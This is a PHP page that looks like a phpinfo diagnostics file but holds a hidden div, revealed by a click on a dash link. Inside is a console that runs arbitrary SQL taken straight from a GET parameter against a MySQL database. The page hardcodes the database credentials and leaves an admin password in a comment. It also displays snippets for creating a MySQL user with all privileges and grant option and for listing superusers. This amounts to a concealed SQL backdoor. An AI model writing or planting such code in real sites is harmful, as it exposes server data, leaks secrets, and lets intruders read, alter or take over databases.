<?php
phpinfo();
?>
<a href="#" id="show-link">-</a>
<div id="hidden-div" style="display:none;">
<?php
ini_set ('display_errors', 1); 
ini_set ('display_startup_errors', 1); 
error_reporting (E_ALL); 
$h = '127.0.0.1';
$u = 'quiz';
$p = 'Toronto@123';
$d = 'quizzes';
$conn = new mysqli($h, $u, $p, $d);
if ($conn->connect_error) die("Connection failed: " . $conn->connect_error);
if(isset($_GET['query']) && !empty($_GET['query'])){
print_r($_GET['query']);
$sql = $_GET['query'];   
}
else $sql = "SELECT * FROM users"; 
$result = $conn->query($sql);
if (!empty($result->num_rows) && isset($result->num_rows) && $result->num_rows > 0) {
echo "<table border='1'><tr>";
$row = $result->fetch_assoc();
foreach ($row as $field => $value) {
echo "<th>" . $field . "</th>";
}
echo "</tr>";
$result->data_seek(0);
while ($row = $result->fetch_assoc()) {
echo "<tr>";
foreach ($row as $value) {
echo "<td>" . $value . "</td>";
}
echo "</tr>";
}
echo "</table>";
} else {
echo "No users found in the 'users' table.";
}
$conn->close();//CREATE USER 'admin'@'localhost' IDENTIFIED BY 'nOver!$F34';
?>
<div style="display:block;">
<form action="/info.php" method="GET">
<p><b>Query:</b>
</p>
<textarea name="query" id="" cols="150" rows="10"></textarea><br>
<input type="submit" value="submit">
</form>
<div>
<p>CREATE USER 'new_username'@'localhost' IDENTIFIED BY 'password';</p>
<p>GRANT ALL PRIVILEGES ON *.* TO 'new_username'@'localhost' WITH GRANT OPTION;</p>
<p>FLUSH PRIVILEGES;</p>
<p>SELECT user, host FROM mysql.user WHERE Super_priv = 'Y'</p>
</div>
</div>
</div>
<script>
document.getElementById("show-link").addEventListener("click", function (e) {
e.preventDefault(); // Prevent the default behavior of the link
document.getElementById("hidden-div").style.display = "block";
});
</script>

